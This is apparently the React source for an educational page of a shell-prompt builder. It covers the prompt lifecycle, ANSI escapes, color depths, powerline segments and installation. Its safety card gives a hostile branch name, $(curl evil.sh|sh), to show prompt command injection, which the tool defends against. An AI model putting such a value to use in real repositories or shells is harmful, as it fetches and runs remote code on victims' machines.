/**
 * How shell prompts work — with live, theme-aware diagrams.
 */
import { ArrowDown, ArrowRight, Cpu, Download, ExternalLink, Gauge, Heart, KeyRound, Palette as PaletteIcon, ShieldCheck, TerminalSquare } from 'lucide-react';
import { useMemo, type ReactNode } from 'react';
import { getPalette } from '../../data/palettes';
import type { Palette } from '../../data/palette-types';
import { ACCENT_TOKENS } from '../../data/palette-types';
import { rgbToHex } from '../../lib/color';
import { compile } from '../../lib/compile';
import { ESC_INFO, evalEsc } from '../../lib/escapes';
import type { Esc } from '../../lib/ir';
import { DEFAULT_SETTINGS, tok, type PromptDoc } from '../../lib/model';
import { renderSession } from '../../lib/render';
import { DEFAULT_SCENARIO } from '../../lib/scenario';
import { colorToHex, convertColor } from '../../lib/sgr';
import { hexToRgb } from '../../lib/color';
import { usePrompt } from '../../store/prompt';
import { TerminalView } from '../terminal/TerminalView';
import { cn } from '../../lib/cn';

function H2({ icon, children, id }: { icon: ReactNode; children: ReactNode; id: string }) {
  return (
    <h2 id={id} className="flex scroll-mt-24 items-center gap-2.5 text-2xl font-bold tracking-tight">
      <span className="flex size-9 items-center justify-center rounded-xl bg-accent/15 text-accent">{icon}</span>
      {children}
    </h2>
  );
}

function P({ children }: { children: ReactNode }) {
  return <p className="max-w-3xl text-pretty leading-relaxed text-subtext0">{children}</p>;
}

function C({ children }: { children: ReactNode }) {
  return <code className="rounded-md bg-surface0/70 px-1.5 py-0.5 font-mono text-[0.85em] text-text">{children}</code>;
}

// ── 1. lifecycle ─────────────────────────────────────────────────────────────

const STEPS = [
  { t: 'You press Enter', d: 'readline hands the line to bash.', c: 'blue' },
  { t: 'PS0 is expanded', d: 'bash 4.4+. Bashin notes the start time here — that is how “took 4.8s” works.', c: 'sapphire' },
  { t: 'The command runs', d: 'When it exits, its status lands in $?.', c: 'teal' },
  { t: 'PROMPT_COMMAND runs', d: '__bashin_prompt reads $? first, then git, venv, kube… and assembles PS1.', c: 'green' },
  { t: 'PS1 is decoded', d: '\\u \\w \\t become text; \\[ \\] mark escapes as zero-width so readline can count columns.', c: 'yellow' },
  { t: 'PS1 is expanded', d: '${variables} are substituted — and their contents are never expanded again.', c: 'peach' },
  { t: 'readline draws it', d: 'Colors, the right prompt, your cursor. Then it waits for you.', c: 'mauve' },
];

function Lifecycle() {
  return (
    <div className="relative grid gap-3 sm:grid-cols-2 xl:grid-cols-4">
      {STEPS.map((s, i) => (
        <div key={s.t} className="relative rounded-2xl border border-surface0 bg-mantle p-4">
          <div className="mb-2 flex items-center gap-2">
            <span className="flex size-6 items-center justify-center rounded-full font-mono text-xs font-bold text-crust" style={{ backgroundColor: `var(--ctp-${s.c})` }}>
              {i + 1}
            </span>
            <h3 className="font-semibold tracking-tight">{s.t}</h3>
          </div>
          <p className="text-[0.8125rem] leading-snug text-subtext0">{s.d}</p>
          {i < STEPS.length - 1 && (
            <ArrowRight className="absolute -right-2.5 top-1/2 hidden size-4 -translate-y-1/2 text-overlay0 xl:block" aria-hidden />
          )}
        </div>
      ))}
      <div className="flex items-center justify-center rounded-2xl border border-dashed border-surface1 p-4 text-center text-[0.8125rem] text-overlay1">
        <span>
          …and around again for the next command.
          <ArrowDown className="mx-auto mt-1 size-4" aria-hidden />
        </span>
      </div>
    </div>
  );
}

// ── 2. anatomy ───────────────────────────────────────────────────────────────

function Anatomy({ palette }: { palette: Palette }) {
  const mauve = palette.tokens.mauve;
  const [r, g, b] = [hexToRgb(mauve).r, hexToRgb(mauve).g, hexToRgb(mauve).b];
  const parts: { s: string; label: string; c: string }[] = [
    { s: '\\[', label: 'start invisible', c: 'overlay1' },
    { s: '\\e[', label: 'escape: CSI', c: 'sky' },
    { s: '1', label: 'bold', c: 'yellow' },
    { s: ';', label: '', c: 'overlay0' },
    { s: `38;2;${r};${g};${b}`, label: '24-bit text color (r;g;b)', c: 'mauve' },
    { s: 'm', label: 'end of SGR', c: 'sky' },
    { s: '\\]', label: 'end invisible', c: 'overlay1' },
    { s: '\\u', label: 'your username', c: 'green' },
    { s: '\\[\\e[0m\\]', label: 'reset', c: 'red' },
  ];
  return (
    <div className="overflow-x-auto rounded-2xl border border-surface0 bg-crust/50 p-5">
      <div className="flex min-w-max items-start gap-1.5 font-mono text-[0.95rem]">
        {parts.map((p, i) => (
          <div key={i} className={cn('flex flex-col items-center', p.label && 'min-w-[4.75rem]')}>
            <span className="rounded-md px-1 py-0.5" style={{ color: `var(--ctp-${p.c})`, backgroundColor: `color-mix(in oklab, var(--ctp-${p.c}) 12%, transparent)` }}>
              {p.s}
            </span>
            {p.label && (
              <>
                <span className="h-3 w-px" style={{ backgroundColor: `var(--ctp-${p.c})` }} />
                <span className="max-w-[6.5rem] text-balance text-center font-sans text-[0.6875rem] leading-tight text-subtext0">{p.label}</span>
              </>
            )}
          </div>
        ))}
        <div className="ml-5 flex flex-col items-center">
          <span className="rounded-md px-2 py-0.5 text-overlay1">→</span>
        </div>
        <div className="flex flex-col items-center">
          <span className="rounded-md px-2 py-0.5 font-bold" style={{ color: mauve, backgroundColor: palette.terminal.background }}>
            nova
          </span>
          <span className="h-3 w-px bg-mauve" />
          <span className="font-sans text-[0.6875rem] text-subtext0">what you see</span>
        </div>
      </div>
      <p className="mt-4 text-[0.8125rem] text-overlay1">
        Forget a <C>\[ … \]</C> pair and readline counts the escape bytes as columns: the cursor lands in the wrong place and long
        commands wrap over your prompt. Bashin wraps every escape for you.
      </p>
    </div>
  );
}

// ── 3. colors ────────────────────────────────────────────────────────────────

function ColorDepths({ palette }: { palette: Palette }) {
  const rows = (['truecolor', '256', '16'] as const).map((d) => ({
    d,
    label: d === 'truecolor' ? '24-bit' : d === '256' ? '256 colors' : '16 colors',
    code: d === 'truecolor' ? '38;2;r;g;b' : d === '256' ? '38;5;n' : '30–37 · 90–97',
    colors: ACCENT_TOKENS.map((t) => {
      const { r, g, b } = hexToRgb(palette.tokens[t]);
      return colorToHex(convertColor({ k: 'rgb', r, g, b }, d, palette), palette);
    }),
  }));
  return (
    <div className="overflow-x-auto rounded-2xl border border-surface0 bg-mantle p-4">
      <table className="w-full min-w-[34rem] border-separate border-spacing-y-1.5 text-sm">
        <thead>
          <tr className="text-left text-[0.6875rem] uppercase tracking-wider text-overlay1">
            <th className="w-28 font-semibold">Depth</th>
            <th className="w-32 font-semibold">SGR</th>
            {ACCENT_TOKENS.map((t) => (
              <th key={t} className="text-center font-normal normal-case tracking-normal">
                <span className="inline-block -rotate-45 text-[0.625rem]">{t}</span>
              </th>
            ))}
          </tr>
        </thead>
        <tbody>
          {rows.map((r) => (
            <tr key={r.d}>
              <td className="font-medium">{r.label}</td>
              <td className="font-mono text-xs text-subtext0">{r.code}</td>
              {r.colors.map((c, i) => (
                <td key={i} className="px-0.5">
                  <span className="block h-7 rounded-md ring-1 ring-black/15" style={{ backgroundColor: c }} title={c} />
                </td>
              ))}
            </tr>
          ))}
        </tbody>
      </table>
      <p className="mt-2 text-[0.8125rem] text-overlay1">
        {palette.name}’s accents at each depth. 256-color output uses the nearest cube or gray entry (measured in OKLab); 16-color output
        maps onto the terminal’s own ANSI colors, so it follows whatever theme the terminal uses. Choose <b className="text-subtext0">Auto</b>{' '}
        to ship all three and pick at startup.
      </p>
    </div>
  );
}

// ── 4. powerline ─────────────────────────────────────────────────────────────

const POWERLINE_DEMO: PromptDoc = {
  v: 1,
  name: 'powerline',
  settings: { ...DEFAULT_SETTINGS, separator: 'powerline' },
  elements: [
    { id: 'a', type: 'user', style: { bg: tok('mauve'), fg: tok('crust'), bold: true } },
    { id: 'b', type: 'cwd', options: { mode: 'base' }, style: { bg: tok('blue'), fg: tok('crust') } },
    { id: 'c', type: 'git-branch', options: { icon: '', showOp: false }, style: { bg: tok('green'), fg: tok('crust') } },
  ],
};

function Powerline({ palette }: { palette: Palette }) {
  const session = useMemo(() => {
    const doc = { ...POWERLINE_DEMO, settings: { ...POWERLINE_DEMO.settings, palette: palette.id } };
    return renderSession(compile(doc), { palette, depth: 'truecolor', history: [], current: { ...DEFAULT_SCENARIO, cols: 40 } });
  }, [palette]);
  const sw = (c: string) => <span className="inline-block size-3 rounded-sm align-middle ring-1 ring-black/20" style={{ backgroundColor: c }} />;
  return (
    <div className="grid gap-4 rounded-2xl border border-surface0 bg-mantle p-4 md:grid-cols-[auto_1fr] md:items-center">
      <TerminalView term={session.term} palette={palette} fontSize={22} chrome={false} cursor={false} className="rounded-xl" />
      <ul className="flex flex-col gap-2 text-[0.8125rem] text-subtext0">
        <li>
          The arrow <C></C> is one cell: drawn in the <b className="text-text">previous</b> segment’s color {sw(palette.tokens.mauve)} on the{' '}
          <b className="text-text">next</b> segment’s background {sw(palette.tokens.blue)}.
        </li>
        <li>Segments that might be hidden (git, venv…) mean the next separator is only known at runtime, so the prompt function tracks the open segment as it goes.</li>
        <li>Two neighbors with the same background get the thin separator <C></C> instead.</li>
        <li>Right-aligned segments (after a Fill) point the other way.</li>
      </ul>
    </div>
  );
}

// ── 5. escapes ───────────────────────────────────────────────────────────────

function EscapeTable() {
  const rows = (Object.keys(ESC_INFO) as Esc[]).filter((e) => e !== 'strftime');
  return (
    <div className="overflow-x-auto rounded-2xl border border-surface0">
      <table className="w-full min-w-[36rem] text-sm">
        <thead className="bg-mantle text-left text-[0.6875rem] uppercase tracking-wider text-overlay1">
          <tr>
            <th className="px-4 py-2.5 font-semibold">bash</th>
            <th className="px-4 py-2.5 font-semibold">zsh</th>
            <th className="px-4 py-2.5 font-semibold">Meaning</th>
            <th className="px-4 py-2.5 font-semibold">Example</th>
          </tr>
        </thead>
        <tbody className="divide-y divide-surface0">
          {rows.map((e) => (
            <tr key={e} className="hover:bg-surface0/30">
              <td className="px-4 py-2 font-mono text-accent">{ESC_INFO[e].bash}</td>
              <td className="px-4 py-2 font-mono text-subtext1">{ESC_INFO[e].zsh}</td>
              <td className="px-4 py-2 text-subtext0">{ESC_INFO[e].label}</td>
              <td className="px-4 py-2 font-mono text-text">{evalEsc(e, undefined, DEFAULT_SCENARIO)}</td>
            </tr>
          ))}
          <tr className="hover:bg-surface0/30">
            <td className="px-4 py-2 font-mono text-accent">\D{'{%F %T}'}</td>
            <td className="px-4 py-2 font-mono text-subtext1">%D{'{%F %T}'}</td>
            <td className="px-4 py-2 text-subtext0">any strftime(3) format</td>
            <td className="px-4 py-2 font-mono text-text">{evalEsc('strftime', '%F %T', DEFAULT_SCENARIO)}</td>
          </tr>
        </tbody>
      </table>
    </div>
  );
}

// ── 6. fast & safe ───────────────────────────────────────────────────────────

function Card({ icon, title, children, tone = 'accent' }: { icon: ReactNode; title: string; children: ReactNode; tone?: string }) {
  return (
    <div className="rounded-2xl border border-surface0 bg-mantle p-5">
      <div className="mb-2 flex items-center gap-2">
        <span className={cn('flex size-8 items-center justify-center rounded-lg')} style={{ color: `var(--ctp-${tone})`, backgroundColor: `color-mix(in oklab, var(--ctp-${tone}) 15%, transparent)` }}>
          {icon}
        </span>
        <h3 className="font-semibold tracking-tight">{title}</h3>
      </div>
      <div className="flex flex-col gap-2 text-[0.8125rem] leading-relaxed text-subtext0">{children}</div>
    </div>
  );
}

const TOC = [
  ['lifecycle', 'How a prompt is drawn'],
  ['anatomy', 'Anatomy of an escape'],
  ['colors', '16, 256 or 24-bit'],
  ['powerline', 'Powerline segments'],
  ['fast', 'Fast and safe prompts'],
  ['escapes', 'Escape reference'],
  ['install', 'Installing'],
  ['credits', 'Credits'],
] as const;

export function Learn() {
  const paletteId = usePrompt((s) => s.doc.settings.palette);
  const palette = getPalette(paletteId);
  const sample = rgbToHex(hexToRgb(palette.tokens.mauve));

  return (
    <div className="mx-auto grid w-full max-w-[1400px] gap-10 px-4 pb-20 pt-8 lg:grid-cols-[13rem_minmax(0,1fr)] xl:px-6">
      <nav className="hidden lg:block" aria-label="On this page">
        <div className="sticky top-24 flex flex-col gap-1">
          <div className="eyebrow mb-1">On this page</div>
          {TOC.map(([id, label]) => (
            <a key={id} href={`#${id}`} onClick={(e) => (e.preventDefault(), document.getElementById(id)?.scrollIntoView({ behavior: 'smooth' }))} className="rounded-lg px-2 py-1 text-sm text-subtext0 hover:bg-surface0/60 hover:text-text">
              {label}
            </a>
          ))}
        </div>
      </nav>
      <article className="flex min-w-0 flex-col gap-12">
        <header>
          <h1 className="text-3xl font-bold tracking-tight sm:text-4xl">How shell prompts work</h1>
          <P>
            A prompt is just a string — but one the shell decodes, expands and measures every single time you hit Enter. Knowing what happens
            at each step is the difference between a prompt that feels instant and one that stutters, garbles long lines, or runs code it
            should only print.
          </P>
        </header>

        <section className="flex flex-col gap-4">
          <H2 id="lifecycle" icon={<TerminalSquare className="size-[1.1rem]" />}>
            How a prompt is drawn
          </H2>
          <P>
            Between two commands bash goes through the same loop. zsh is the same with different names: <C>precmd</C> for PROMPT_COMMAND,{' '}
            <C>preexec</C> for PS0, <C>%n</C> for <C>\u</C>.
          </P>
          <Lifecycle />
        </section>

        <section className="flex flex-col gap-4">
          <H2 id="anatomy" icon={<KeyRound className="size-[1.1rem]" />}>
            Anatomy of an escape
          </H2>
          <P>
            Colors are ANSI SGR sequences. In <C>PS1</C> each one sits between <C>\[</C> and <C>\]</C> so readline knows it takes no space.
            Here is one bold, {palette.name} mauve <span className="font-mono" style={{ color: sample }}>{sample}</span> username:
          </P>
          <Anatomy palette={palette} />
        </section>

        <section className="flex flex-col gap-4">
          <H2 id="colors" icon={<PaletteIcon className="size-[1.1rem]" />}>
            16, 256 or 24-bit
          </H2>
          <P>
            Almost every terminal from the last decade draws 24-bit color: iTerm2, kitty, WezTerm, Alacritty, GNOME Terminal, Windows Terminal,
            Ghostty — and macOS Terminal since Tahoe. Over old SSH hops, inside some tmux setups, or on a serial console, fewer colors are
            safer.
          </P>
          <ColorDepths palette={palette} />
        </section>

        <section className="flex flex-col gap-4">
          <H2 id="powerline" icon={<ArrowRight className="size-[1.1rem]" />}>
            Powerline segments
          </H2>
          <P>
            Give an element a background and Bashin joins it to its neighbors with the separator style you pick — arrows, capsules, slants,
            flames, pixels or fade blocks. The glyphs live in the Private Use Area, so they need a{' '}
            <a className="text-accent underline-offset-2 hover:underline" href="https://www.nerdfonts.com/font-downloads" target="_blank" rel="noreferrer">
              Nerd Font
            </a>{' '}
            (or a Powerline-patched font); the fade-block style works with any font.
          </P>
          <Powerline palette={palette} />
        </section>

        <section className="flex flex-col gap-4">
          <H2 id="fast" icon={<Gauge className="size-[1.1rem]" />}>
            Fast and safe prompts
          </H2>
          <div className="grid gap-4 md:grid-cols-2">
            <Card icon={<Cpu className="size-4" />} title="No forks for the common things" tone="green">
              <p>
                Every <C>$(…)</C> forks a process, and forks are what make prompts lag — especially on WSL, macOS and busy servers. Bashin reads
                the git branch straight from <C>.git/HEAD</C>, the kube context straight from your kubeconfig, the time from bash’s own{' '}
                <C>\D{'{…}'}</C>, the job count from <C>\j</C>.
              </p>
              <p>
                Git status costs exactly one <C>git status</C>, only inside repositories, with <C>GIT_OPTIONAL_LOCKS=0</C> and a 2-second timeout
                — a repo that times out shows just its branch from then on. This is NovaShell’s performance contract, carried over.
              </p>
            </Card>
            <Card icon={<ShieldCheck className="size-4" />} title="Displayed, never executed" tone="red">
              <p>
                Many prompt snippets paste the branch name into PS1: <C>PS1="… $(git branch) …"</C>. Then a branch called{' '}
                <C>$(curl evil.sh|sh)</C> runs when you <C>cd</C> into a cloned repo.
              </p>
              <p>
                Bashin stores dynamic text in variables and puts only <C>{'${__bashin_git_branch}'}</C> in PS1. The shell does not expand the
                result of an expansion again, so the name is printed, not run. In zsh, <C>%</C> signs in values are escaped too. The test suite
                checks this against real shells with hostile directory names, branches and variables.
              </p>
            </Card>
          </div>
        </section>

        <section className="flex flex-col gap-4">
          <H2 id="escapes" icon={<KeyRound className="size-[1.1rem]" />}>
            Escape reference
          </H2>
          <P>Examples use the preview scenario (user nova on host zeus).</P>
          <EscapeTable />
        </section>

        <section className="flex flex-col gap-4">
          <H2 id="install" icon={<Download className="size-[1.1rem]" />}>
            Installing
          </H2>
          <ol className="grid gap-3 md:grid-cols-3">
            {[
              ['Copy', 'Use Copy on the code panel. The snippet is self-contained — no plugins, no frameworks.'],
              ['Paste', 'Add it to the end of ~/.bashrc (or ~/.zshrc), or pick “Installer” and paste that into a terminal: it saves ~/.config/bashin/prompt.bash and sources it for you.'],
              ['Reload', 'Open a new terminal or run `source ~/.bashrc`. Prompts with icons need a Nerd Font selected in your terminal.'],
            ].map(([t, d], i) => (
              <li key={t} className="rounded-2xl border border-surface0 bg-mantle p-4">
                <div className="mb-1.5 flex items-center gap-2 font-semibold">
                  <span className="flex size-6 items-center justify-center rounded-full bg-accent font-mono text-xs text-crust">{i + 1}</span>
                  {t}
                </div>
                <p className="text-[0.8125rem] leading-snug text-subtext0">{d}</p>
              </li>
            ))}
          </ol>
          <P>
            To undo, delete the snippet (or the two Bashin lines in your rc file) and open a new terminal. Bashin prepends its function to
            PROMPT_COMMAND and leaves anything already there in place, so tools like direnv keep working.
          </P>
        </section>

        <section className="flex flex-col gap-4">
          <H2 id="credits" icon={<Heart className="size-[1.1rem]" />}>
            Credits
          </H2>
          <ul className="grid gap-2 text-sm text-subtext0 sm:grid-cols-2">
            {[
              ['NovaShell', 'the prompt styles, the fork-free git helper and the perf contract that inspired this', null],
              ['Catppuccin', 'the default palette and the site theme', 'https://catppuccin.com'],
              ['Nerd Fonts', 'the icon and powerline glyphs (subset bundled, see license)', 'https://www.nerdfonts.com'],
              ['Lucide', 'interface icons', 'https://lucide.dev'],
              ['Simple Icons', 'brand marks', 'https://simpleicons.org'],
              ['Shiki', 'code highlighting', 'https://shiki.style'],
              ['bash-prompt-generator.org', 'the original idea of a visual PS1 builder', 'https://bash-prompt-generator.org'],
              ['Theme authors', 'Rosé Pine, Dracula, Nord, Gruvbox, Tokyo Night, Solarized, Everforest, Kanagawa, Ayu and more', null],
            ].map(([n, d, href]) => (
              <li key={n} className="rounded-xl border border-surface0 px-3.5 py-2.5">
                {href ? (
                  <a href={href} target="_blank" rel="noreferrer" className="inline-flex items-center gap-1 font-medium text-text hover:text-accent">
                    {n} <ExternalLink className="size-3" />
                  </a>
                ) : (
                  <span className="font-medium text-text">{n}</span>
                )}{' '}
                — {d}
              </li>
            ))}
          </ul>
        </section>
      </article>
    </div>
  );
}
